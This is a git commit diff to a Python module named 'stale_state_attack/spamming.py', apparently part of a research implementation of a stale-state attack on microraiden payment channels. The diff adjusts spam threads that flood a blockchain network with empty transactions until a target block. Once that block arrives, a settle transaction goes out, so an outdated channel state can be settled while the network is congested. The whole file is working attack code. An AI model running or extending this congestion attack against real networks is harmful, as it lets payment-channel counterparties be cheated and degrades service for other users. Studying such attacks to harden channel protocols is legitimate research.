0e6bb6f6f2eced35e6171ac3a9fe809d199a8bd8
Tim-Jonas Schwarz <tmjssz@gmail.com>
2018-05-14 15:25:48 +0200

    Adjust number of spam transaction to number of remaining blocks until channel can be settled

--- microraiden/stale_state_attack/spamming.py
+++ microraiden/stale_state_attack/spamming.py
@@ -85,36 +85,76 @@ class SpamManager(threading.Thread):
                 except:
                     self.logger.error('Sending settle transaction failed')
             elif self.target_block is not None:
+                pending_transactions = int(self.web3.txpool.status.pending, 16)
+
+                desired_pending_txs = min(
+                    self.congestion_level,
+                    self.remaining_blocks() * 300,
+                )
+
                 self.logger.debug(
                     'Current block = {} / Target block = {}'.format(self.web3.eth.blockNumber, self.target_block))
-                self.logger.info('Pending transactions = {} / Queued transactions = {} / Threads = {} / Target block = {} / Remaining blocks = {}'.format(int(
-                    self.web3.txpool.status.pending, 16), len(tx_queue), threading.active_count(), self.target_block, self.target_block - self.web3.eth.blockNumber))
+                self.logger.info('Pending transactions = {} / Queued transactions = {} / Threads = {} / Target block = {} / Remaining blocks = {} / Desired Pending = {}'.format(
+                    pending_transactions, len(tx_queue), threading.active_count(), self.target_block, self.target_block - self.web3.eth.blockNumber, desired_pending_txs))
             else:
+                pending_transactions = int(self.web3.txpool.status.pending, 16)
                 self.logger.debug('Current block = {}'.format(self.web3.eth.blockNumber))
                 self.logger.info('Pending transactions = {} / Queued transactions = {} / Threads = {}'.format(
-                    int(self.web3.txpool.status.pending, 16), len(tx_queue), threading.active_count()))
+                    pending_transactions, len(tx_queue), threading.active_count()))
 
             time.sleep(10)
 
-    def update_target_block(self, block):
-        self.target_block = block
+    def update_target_block(self, block_number):
+        '''
+        Update the number of the target block until which the network
+        shall be spammed. As soon as this block is created by the blockchain
+        network, a channel settle request will be sent.
+        '''
+        self.target_block = block_number
+        for thread in self.threads:
+            thread.update_target_block(block_number)
 
     def target_block_reached(self) -> bool:
+        '''
+        Returns True if the target block number has already been created.
+        '''
         if self.target_block is None:
             return False
         return self.web3.eth.blockNumber >= self.target_block
 
     def number_sent_transactions(self) -> int:
+        '''
+        Returns the number of spammed transactions.
+        '''
         return tx_sent_counter
 
     def queued_transactions(self) -> int:
+        '''
+        Returns the number of created signed transaction which
+        are in the queue of the transactions to be sent next.
+        '''
         return tx_queue
 
     def wait_for_full_tx_queue(self) -> int:
+        '''
+        Wait until the queue of transactions to be sent next
+        has reached the minimum number of transactions.
+        '''
         while len(tx_queue) < MIN_QUEUED_TXS:
             time.sleep(0.25)
 
+    def remaining_blocks(self) -> int:
+        '''
+        Return the number of blocks until the target block.
+        '''
+        if self.target_block is None:
+            return 500
+        return max(0, self.target_block - self.web3.eth.blockNumber)
+
     def stop(self):
+        '''
+        Stop the execution of this and all spam worker threads.
+        '''
         self.do_run = False
         for thread in self.threads:
             thread.stop()
@@ -123,7 +163,8 @@ class SpamManager(threading.Thread):
 
 class SpamThread(threading.Thread):
     '''
-    The SpamThread class can be used to repeatedly send empty spam transactions into a blockchain network.
+    The SpamThread class can be used to repeatedly send empty spam transactions
+    into a blockchain network.
     '''
 
     def __init__(
@@ -141,6 +182,7 @@ class SpamThread(threading.Thread):
         self.initial_nonce = initial_nonce
         self.congestion_level = congestion_level
 
+        self.target_block = None
         self.do_run = True
         self.do_send = False
 
@@ -156,19 +198,24 @@ class SpamThread(threading.Thread):
 
         self.do_run = True
 
-        while self.do_run:
-            if self.do_send:
-                try:
-                    # Get pending transactions from geth
-                    pending_transactions = int(self.web3.txpool.status.pending, 16)
+        while (self.do_run) & (not self.target_block_reached()):
+            try:
+                # Get pending transactions from geth
+                pending_transactions = int(self.web3.txpool.status.pending, 16)
 
-                    if pending_transactions < self.congestion_level:
-                        # If congestion level is not reached yet, send the next transaction
-                        self.send_next_transaction()
-                        continue
-                except:
-                    continue
-            elif len(tx_queue) < MAX_QUEUED_TXS:
+                desired_pending_txs = min(
+                    self.congestion_level,
+                    self.remaining_blocks() * 300,
+                )
+            except:
+                continue
+
+            if (self.do_send) & (pending_transactions < desired_pending_txs):
+                # If congestion level is not reached yet, send the next transaction
+                self.send_next_transaction()
+                continue
+
+            if len(tx_queue) < MAX_QUEUED_TXS:
                 # Only create another transaction if sending mode is not active
                 self.create_next_transaction()
 
@@ -219,6 +266,32 @@ class SpamThread(threading.Thread):
         '''
         self.do_send = True
 
+    def target_block_reached(self) -> bool:
+        '''
+        Returns True if the target block number has already been created.
+        '''
+        if self.target_block is None:
+            return False
+        return self.web3.eth.blockNumber >= self.target_block
+
+    def remaining_blocks(self) -> int:
+        '''
+        Return the number of blocks until the target block.
+        '''
+        if self.target_block is None:
+            return 500
+        return max(0, self.target_block - self.web3.eth.blockNumber)
+
+    def update_target_block(self, block_number):
+        '''
+        Update the number of the target block until which the network
+        shall be spammed.
+        '''
+        self.target_block = block_number
+
     def stop(self):
+        '''
+        Stop the execution of this thread.
+        '''
         self.do_run = False
         self.do_send = False
